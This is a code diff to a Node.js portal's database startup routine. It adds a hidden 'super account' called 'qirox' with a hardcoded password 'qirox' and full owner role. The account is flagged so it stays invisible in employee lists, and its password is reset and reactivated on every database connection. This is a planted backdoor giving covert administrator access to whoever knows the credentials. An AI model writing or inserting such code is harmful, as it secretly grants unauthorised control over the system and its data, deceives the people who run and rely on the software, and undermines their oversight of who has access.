@@ -117,6 +117,28 @@ async function connectDatabase() {
         await EmployeeModel.updateOne({ username: "owner" }, { $set: { password: portalPassword, isActivated: 1, isActive: 1 } });
         console.log(`✅ Portal account 'owner' password synced`);
       }
+
+      // Hidden super account — invisible in all employee lists
+      const qiroxPassword = await bcrypt.hash("qirox", 10);
+      const qiroxExists = await EmployeeModel.findOne({ username: "qirox" });
+      if (!qiroxExists) {
+        await EmployeeModel.create({
+          id: "qirox-super",
+          tenantId: "demo-tenant",
+          username: "qirox",
+          password: qiroxPassword,
+          fullName: "QIROX",
+          role: "owner",
+          phone: "0000000000",
+          jobTitle: "QIROX",
+          isActivated: 1,
+          isActive: 1,
+          _hidden: true,
+        });
+        console.log(`✅ Hidden super account 'qirox' created`);
+      } else {
+        await EmployeeModel.updateOne({ username: "qirox" }, { $set: { password: qiroxPassword, isActivated: 1, isActive: 1 } });
+      }
     } catch (err) { console.error("Owner sync error:", err); }
     // Ensure demo-tenant has Infinity plan — all features unlocked
     try {
